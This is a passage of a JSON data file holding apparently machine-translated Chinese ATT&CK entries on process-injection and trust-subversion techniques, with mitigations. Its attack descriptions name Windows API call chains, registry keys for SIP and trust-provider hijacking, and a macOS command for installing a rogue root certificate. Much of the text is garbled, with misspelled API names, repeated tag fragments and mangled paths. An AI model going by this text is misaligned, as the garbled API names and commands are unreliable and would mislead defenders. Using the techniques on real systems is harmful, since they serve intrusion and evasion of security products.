          "content": "对手可以将恶意代码注入被劫持的过程中，以逃避基于过程的防御，并可能提高特权。线程执行劫持是一种在单独的实时过程的地址空间中执行任意代码的方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "线程执行劫持通常是通过暂停现有进程然后拆卸/空心内存来执行的，然后可以将其替换为恶意代码或通往DLL的路径。首先使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " openthread "
        },
        {
          "type": "text",
          "content": "）创建了现有受害者过程的句柄。此时，可以将过程暂停，然后将其写入，重新调整到注入的代码，并通过"
        },
        {
          "type": "code",
          "content": " suppendThread "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " virtualalloolocex "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " writeprocessmemory "
        },
        {
          "type": "text",
          "content": "，<code "
        },
        {
          "type": "code",
          "content": "> setThreadContext "
        },
        {
          "type": "text",
          "content": "，然后分别"
        },
        {
          "type": "code",
          "content": " RESUMETHREAD "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这与过程中空非常相似，但针对现有过程，而不是以悬浮状态创建过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过线程执行劫持的执行也可以从安全产品中逃避检测，因为在合法过程中执行被掩盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.004",
    "name": "Asynchronous Procedure Call",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过异步程序调用（APC）队列将恶意代码注入过程中，以逃避基于过程的防御并可能提高特权。APC注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "APC注入通常是通过将恶意代码附加到过程线程的APC队列中执行的。当线程输入可更换状态时，将执行排队的APC功能。首先使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " Openthread "
        },
        {
          "type": "text",
          "content": "）创建了现有受害者过程的句柄。此时，"
        },
        {
          "type": "code",
          "content": " queueuserapc "
        },
        {
          "type": "text",
          "content": "可以用于调用功能（例如"
        },
        {
          "type": "code",
          "content": " loadlibraya "
        },
        {
          "type": "text",
          "content": "指向恶意DLL）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "APC注入的一种被称为“早鸟注射”的变体涉及创建一个悬浮过程，在该过程中，可以在过程中编写和执行恶意代码，并通过APC在过程'入口点（可能是后来的反恶意钩）。ATOMBOMBING是另一种使用APC来调用先前写入全球原子表的恶意代码的变体。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过APC注入执行还可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.005",
    "name": "Thread Local Storage",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过线程本地存储（TLS）回调将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。TLS回调注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "TLS回调注入涉及在可执行（PE）内操纵指针，以将过程重定向到恶意代码，然后再达到该代码的合法入口点。OS通常使用TLS回调来设置和/或线程使用的清理数据。操纵TLS回调可以通过使用其他进程注入技术（例如过程挖空）在过程的内存空间内分配和写入过程中的特定偏移来执行回调。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过TLS回调注入执行还可以从安全产品中逃避检测，因为在合法过程中执行被掩盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.008",
    "name": "Ptrace System Calls",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过PTRACE（过程跟踪）系统调用将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。PTRACE系统调用注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PTRACE系统调用注入涉及附加并修改运行过程。PTRACE系统调用使调试过程可以观察和控制另一个过程（以及每个单独的线程），包括更改内存和寄存器值。PTRACE系统调用注入通常是通过将任意代码写入运行过程（例如："
        },
        {
          "type": "code",
          "content": " malloc "
        },
        {
          "type": "text",
          "content": "），然后使用"
        },
        {
          "type": "code",
          "content": " ptrace_setregs "
        },
        {
          "type": "text",
          "content": "来设置包含下一个指令的寄存器以执行执行的寄存器来执行该内存。PTRACE系统调用注入也可以使用"
        },
        {
          "type": "code",
          "content": " ptrace_poketext "
        },
        {
          "type": "text",
          "content": "/"
        },
        {
          "type": "code",
          "content": " ptrace_pokedata "
        },
        {
          "type": "text",
          "content": "将数据复制到目标过程内存中的特定地址（例如：下一个指令的当前地址））。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PTRACE系统调用注入可能是非儿童过程和/或具有更高特权的目标过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过PTRACE系统呼叫注入执行还可以从安全产品中逃避检测，因为在合法过程中执行被掩盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "利用YAMA（ex/proc/proc/sys/kernel/yama/ptrace_scope）来减轻基于PTRACE的过程注入，仅限于仅将PTRACE使用用于特权用户。其他缓解控制措施涉及部署安全内核模块，这些模块提供了高级访问控制和流程限制，例如Selinux，Grsecurity和Apparmor。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.009",
    "name": "Proc Memory",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过 /PROC文件系统将恶意代码注入过程中，以逃避基于过程的防御以及可能提高特权。Proc内存注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PROC内存注入涉及通过/proc文件系统（"
        },
        {
          "type": "code",
          "content": "/proc/[pid] "
        },
        {
          "type": "text",
          "content": "）枚举过程的内存，然后用可用的小工具/说明来制定面向返回的编程（ROP）有效负载。每个运行过程都有自己的目录，其中包括内存映射。PROC内存注入通常是通过使用 /proc文件系统提供的内存映射覆盖目标进程的堆栈来执行的。这些信息可用于枚举偏移量（包括堆栈）和小工具（或程序中可用于构建恶意有效载荷的说明），否则是由过程内存保护所隐藏的，例如地址空间布局随机化（ASLR）。列举后，可以使用dd覆盖目标进程的内存映射"
        },
        {
          "type": "code",
          "content": "/proc/[pid]/maps "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "其他技术（例如动态链接器劫持措施）可以使用更多可用小工具来填充目标过程。类似于过程挖空，PROC记忆注入可能针对儿童过程（例如睡眠的背景副本）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过PROC内存注入执行也可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制敏感文件上的权限，例如"
            },
            {
              "type": "code",
              "content": "/proc/[pid]/maps "
            },
            {
              "type": "text",
              "content": "或"
            },
            {
              "type": "code",
              "content": "/proc/[pid]/mem "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.011",
    "name": "Extra Window Memory Injection",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过额外的窗口内存（EWM）将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。EWM注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在创建窗口之前，基于图形的Windows进程必须规定或注册Windows类，该类规定外观和行为（通过Windows过程，这是处理数据输入/输出的函数）。新Windows类的注册可以包括一个请求，要求将高达40个字节的EWM的请求附加到该类实例的分配内存中。该EWM旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口（API）函数以设置并获取其值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "虽然很小，但EWM足够大，可以存储32位指针，并且通常用于指向Windows过程。恶意软件可能在攻击链的一部分中使用此内存位置，其中包括将代码写入该过程内存的共享部分，将指针放置在EWM中的代码，然后通过将执行控件返回到该过程的EWM中的地址来调用执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过EWM注入授予的执行可能允许访问目标过程的内存和可能提高的特权。为共享部分写有效载荷还避免使用高度监视的API调用，例如"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " createRemoteThreadRead "
        },
        {
          "type": "text",
          "content": "。更复杂的恶意软件样本还可能通过触发Windows过程和其他系统功能的组合来绕开保护机制，例如数据执行预防（DEP），这些功能将在目标过程的可执行文件中重写恶意有效负载。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过EWM注入执行也可以从安全产品中逃避检测，因为在合法过程中掩盖了执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.012",
    "name": "Process Hollowing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意代码注入悬浮和空心的过程中，以逃避基于过程的防御。流程空心是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "流程空心通常是通过在悬浮状态下创建一个过程然后拆开/空心内存来执行的，然后可以用恶意代码替换。可以使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " createProcess "
        },
        {
          "type": "text",
          "content": "）创建受害者进程，其中包含一个悬挂流程主线程的标志。此时，可以使用API呼叫（例如"
        },
        {
          "type": "code",
          "content": " ZwunMapViewOfSection "
        },
        {
          "type": "text",
          "content": ">或"
        },
        {
          "type": "code",
          "content": " ntunmapviewofsection "
        },
        {
          "type": "text",
          "content": "）将过程取消启动，然后将其重新调整为注入代码，并通过"
        },
        {
          "type": "code",
          "content": " firtualalocex </代码>， writeProcessMemory "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " setThreadContext "
        },
        {
          "type": "text",
          "content": "，然后分别"
        },
        {
          "type": "code",
          "content": " RESUMETHREAD "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这与线程本地存储非常相似，但创建了一个新过程，而不是针对现有过程。由于注入过程（并因此继承了注射过程），因此这种行为可能不会导致特权提高。但是，由于在合法的过程中掩盖了执行，因此通过流程挖空执行也可以从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.013",
    "name": "Process Doppelgänging",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过流程Doppelgänging将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。过程Doppelgänging是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows交易NTFS（TXF）是在Vista中引入的，作为执行安全文件操作的方法。为了确保数据完整性，TXF仅启用一个交易手柄即可在给定时间写入文件。在终止写入手柄交易之前，所有其他处理都与作者隔离，并且只能读取打开手柄时存在的文件的订单版本。为避免损坏，如果系统或应用程序在写入事务期间失败，则TXF执行自动回滚。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管已弃用，但TXF应用程序编程接口（API）仍在Windows 10开始启用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用TXF，以执行无文件注入的变化。类似于过程挖空，过程doppelgänging涉及更换合法过程的记忆，从而使恶意代码的执行可能逃避防御和检测。ProcessDoppelgänging的使用TXF还避免了使用高度监测的API功能，例如"
        },
        {
          "type": "code",
          "content": " ntunmapviewofsection "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " virtualProtectectexex "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " setThreadContext "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ProcessDoppelgänging以4个步骤实施："
        }
      ],
      [
        {
          "type": "list",
          "content": "交易 - 使用合法可执行文件创建TXF事务，然后用恶意代码覆盖文件。这些更改将是孤立的，只有在交易的背景下可见。"
        },
        {
          "type": "list",
          "content": "加载 - 创建一个共享的内存部分，并加载恶意可执行文件。"
        },
        {
          "type": "list",
          "content": "回滚 - 撤消对原始可执行文件的更改，有效地从文件系统中删除了恶意代码。"
        },
        {
          "type": "list",
          "content": "动画 - 从污染的内存部分创建一个过程并启动执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "由于注入过程（并因此继承了注射过程），因此这种行为可能不会导致特权提高。但是，由于在合法的过程中掩盖了执行情况，因此通过ProcessDoppelgänging执行可能会从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.014",
    "name": "VDSO Hijacking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过VDSO劫持将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。虚拟动态共享对象（VDSO）劫持是一种在单独的实时过程的地址空间中执行任意代码的方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "VDSO劫持涉及将调用重定向到动态链接的共享库。内存保护可能会阻止通过PTRACE系统调用将可执行代码写入进程。但是，对手可能会劫持从vdso共享对象映射到一个过程中的SYSCALL接口代码存根，以执行SYSCALLS以打开并映射恶意共享对象。然后，可以通过在过程的“全局偏移表中存储”（存储映射库函数的绝对地址）中存储的修补内存地址引用来调用该代码的执行流来调用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过VDSO劫持的执行也可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.015",
    "name": "ListPlanting",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用列表视图控件将恶意代码注入被劫持的过程中，以逃避基于过程的防御，并可能提高特权。ListPlanting是在单独的实时过程的地址空间中执行任意代码的一种方法。由于在合法过程中掩盖了执行情况，因此通过清单插入执行的代码也可以从安全产品中逃避检测。"
        }
      ],
      [
        {
          "type": "text",
          "content": "列表视图控件是用于显示项目集合的用户界面窗口。有关应用程序列表视图设置的信息存储在"
        },
        {
          "type": "code",
          "content": " syslistview32 "
        },
        {
          "type": "text",
          "content": "控制的过程的“内存”中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过将代码复制到使用列表视图控制的过程的虚拟地址空间中，然后使用该代码作为自定义回调以对列出的项目进行分类来执行listPlanting（“破碎攻击”的形式）。对手必须首先将代码复制到目标过程的内存空间中，可以执行各种方式，包括直接获取受害者过程窗口的"
        },
        {
          "type": "code",
          "content": " syslistview32 "
        },
        {
          "type": "text",
          "content": "（通过Windows API调用，例如<code，例如<code）> Findwindow </code>和/或<Code> Enumwindows </code>）或其他过程注入方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "列表插图的一些变化可能会在目标过程中分配内存，但然后使用窗口消息复制有效载荷，以避免使用高度监控的"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "函数。例如，对手可以使用"
        },
        {
          "type": "code",
          "content": " postmessage "
        },
        {
          "type": "text",
          "content": "和/或"
        },
        {
          "type": "code",
          "content": " sendmessage "
        },
        {
          "type": "text",
          "content": " api函数来发送"
        },
        {
          "type": "code",
          "content": " lvm_setItemPosition "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " lvm_getItemposition "
        },
        {
          "type": "text",
          "content": " </code> message，meessess，messages，messages，messages，messages，messages，messages，messages，有效地将有效载荷2字节复制到分配的内存。"
        }
      ],
      [
        {
          "type": "text",
          "content": "最后，通过将"
        },
        {
          "type": "code",
          "content": " lvm_sortitems "
        },
        {
          "type": "text",
          "content": "消息发送到"
        },
        {
          "type": "code",
          "content": " syslistview32 "
        },
        {
          "type": "text",
          "content": "该过程窗口的子女，并在新分配的缓冲区中传递并执行为"
        },
        {
          "type": "code",
          "content": " > ListView_sortItems "
        },
        {
          "type": "text",
          "content": "回调。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1553.001",
    "name": "Gatekeeper Bypass",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Subvert Trust Controls",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改文件属性并颠覆Gatekeeper功能，以逃避用户提示并执行不受信任的程序。Gatekeeper是一组技术，可作为Apple安全模型的一层，以确保仅在主机上执行受信任的应用程序。Gatekeeper是在Snow Leopard（10.6，2009）的文件隔离上建造的，并且已成长为包括代码签名，安全策略合规性，公证等。Gatekeeper还以与重新打开的应用程序不同的方式处理应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "基于选择输入系统，当文件下载文件时，可以通过应用程序执行的应用程序在文件上设置一个称为"
        },
        {
          "type": "code",
          "content": " com.apple.quarantine </codarantine </codarantine </codareantine </codarantine </codaintine </coderantine </coderantine "
        },
        {
          "type": "text",
          "content": "（也称为隔离标志）时下载。启动服务以悬浮状态打开该应用程序。对于带有隔离标志集的首次运行应用程序，Gatekeeper执行以下功能："
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过逻辑错误（例如防御逃避的剥削），未检查的文件类型和外部库中的一个或多个安全控制。例如，在MacOS 13 Ventura之前，仅在第一次启动时进行了代码签名和公证检查，使对手可以为先前打开的应用程序编写恶意的可执行文件，以绕过Gatekeeper Security Checks。"
        }
      ],
      [
        {
          "type": "text",
          "content": "从USB闪存驱动器，光盘，外部硬盘驱动器，通过本地网络共享的驱动器或使用Curl命令从USB闪存驱动器，外部硬盘驱动器，外部硬盘驱动器，或使用Curl命令中加载到系统上的应用程序和文件可能无法设置隔离标志。此外，可以避免使用驱动器妥协设置隔离标志。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "系统设置可以防止运行的应用程序未通过Apple Store下载，这可以帮助减轻其中一些问题。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1553.002",
    "name": "Code Signing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Subvert Trust Controls",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建，获取或窃取代码签名材料以签署其恶意软件或工具。代码签名提供了开发人员的二进制文件的一定程度，并保证二进制尚未篡改。可以由对手创建，获取或偷走操作期间使用的证书。与无效的代码签名不同，此活动将导致有效的签名。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以在现代Windows和MacOS系统上使用以验证第一次运行软件的代码签名。由于平台的分散性，它不在Linux上使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "代码签名证书可用于绕过需要在系统上执行的签名代码的安全策略。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1553.003",
    "name": "SIP and Trust Provider Hijacking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Subvert Trust Controls",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "在进行签名验证检查时，对手可能会篡改SIP和Trust提供商组件，以误导操作系统和应用程序控制工具。在用户模式下，Windows AuthenTicode数字签名用于验证文件的来源和完整性，可用于建立签名代码的信任的变量（例如：具有有效Microsoft签名的驱动程序可以作为安全处理）。签名验证过程是通过WinverifyTrust应用程序编程接口（API）函数来处理的，该函数接受查询并与适当的信任提供商进行协调，该功能负责验证签名的参数。"
        }
      ],
      [
        {
          "type": "text",
          "content": "由于具有不同的可执行文件类型和相应的签名格式，Microsoft创建了称为主题接口软件包（SIP）的软件组件，以提供API函数和文件之间的抽象层。SIPS负责使API函数能够创建，检索，计算和验证签名。对于大多数文件格式（可执行文件，PowerShell，Installer等）都存在唯一的SIP，并且目录签名提供了所有内容），并由全球唯一标识符（GUID）识别。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与代码签名类似，对手可能会滥用此体系结构来颠覆信任控制和绕过安全策略，这些安全策略仅允许合法签名的代码在系统上执行。对手可能会劫持SIP和信任提供商组件，以误导操作系统和应用程序控制工具，以对恶意（或任何）代码进行分类："
        }
      ],
      [
        {
          "type": "list",
          "content": "Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP's CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate从签名的文件。通过指向带有导出功能的恶意制作的DLL，该功能始终返回已知的良好签名值（例如：用于便携式可执行文件的Microsoft签名），而不是文件的真实签名，对手可以使用该文件将可接受的签名值应用于所有文件，并使用该文件将所有文件应用于所有文件SIP（尽管可能会发生HASH不匹配，这使签名无效，因为该函数返回的哈希将与从文件计算的值不匹配）。"
        },
        {
          "type": "list",
          "content": "Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value.通过指向具有导出函数的恶意制作的DLL，该功能始终返回真实（表明验证成功），对手可以使用该sip成功验证任何文件（具有合法签名）（有或不劫持前面提到的cryptsigptsignetdatamsggsigneddatamsg功能）。此注册表值也可以从已经存在的DLL中重定向到合适的导出函数，以避免在磁盘上删除和执行新文件的要求。"
        },
        {
          "type": "list",
          "content": "修改hklm \\软件[WOW6432NODE] Microsoft \\ Cryptography \\ Providers \\ Trust \\ trust \\ Final -Policy {trust Provider guid}的DLL和函数注册表值，该指向DLL指向DLL提供信任提供者的最终策略功能，这是解码和解析的位置并做出了大多数信任决定。类似于劫持SIP的CryptSipDllverifyIndirectData函数，该值可以从已经存在的DLL或恶意制作的DLL中重定向到合适的导出函数（尽管信任提供商的实现很复杂）。"
        },
        {
          "type": "list",
          "content": "注意：上面的劫持也是可能的，而无需通过DLL搜索订单劫持注册表。"
        }
      ],
      [
        {
          "type": "text",
          "content": "劫持SIP或信任提供商组件还可以启用持续的代码执行，因为这些恶意组件可以通过执行代码签名或签名验证的任何应用程序调用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "启用应用程序控制解决方案，例如Appleocker和/或设备护罩，以阻止恶意SIP DLL的加载。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将SIP DLL的存储和执行限制为受保护的目录，例如C：\\ Windows，而不是用户目录。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "确保为注册中心设置适当的权限，以防止用户修改与SIP和Trust提供商组件相关的密钥。如果不防止对注册表密钥进行恶意修改，则可能仍然可以劫持磁盘上已经存在的合适功能。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1553.004",
    "name": "Install Root Certificate",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Subvert Trust Controls",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在折衷的系统上安装根证书，以避免连接到对手控制的Web服务器时警告。根证书在公共密钥密码学中用于识别根证书授权（CA）。安装根证书后，系统或应用程序将信任根证书已签署的根链中的信任链中。证书通常用于在Web浏览器中建立安全的TLS/SSL通信。当用户尝试浏览一个不信任证书的网站时，将显示错误消息，以警告用户安全风险。根据安全设置，浏览器可能不允许用户建立与网站的连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在折衷的系统上安装根证书将为对手提供降低该系统安全性的方法。当折衷的系统通过HTTPS连接到对手控制的Web服务器时，对手已使用此技术来避免安全警告，以提示用户，以欺骗合法网站以收集登录凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "制造商或软件供应链中还将非典型的根证书预先安装在系统上，并与恶意软件/广告软件一起使用，以提供中型功能，以拦截通过安全的TLS/SSL通信传输的信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根证书（及其相关链）也可以克隆和重新安装。克隆的证书链将具有源的许多相同的元数据特征，可用于签署恶意代码，然后绕过签名验证验证工具（例如：sysinternals，antivirus等），用于阻止执行和/或揭示持久性的持久性文物。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在MacOS中，AY MAMI恶意软件使用<code>/usr/bin/Security Add -Trusted -cert -d -r Trustroot -k/library/KeyChains/keychains/system.keychain/path/to/alicic/cod>将恶意证书作为信任的根证书安装到系统钥匙扣中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "Windows组策略可用于管理根证书，"
            },
            {
              "type": "code",
              "content": " flags "
            },
            {
              "type": "text",
              "content": " "
            },
            {
              "type": "code",
              "content": " hklm \\ software \\ politicies \\ microsoft \\ systemcertificates \\ root \\ root \\ root \\ preatectectedRoots "
            },
            {
              "type": "text",
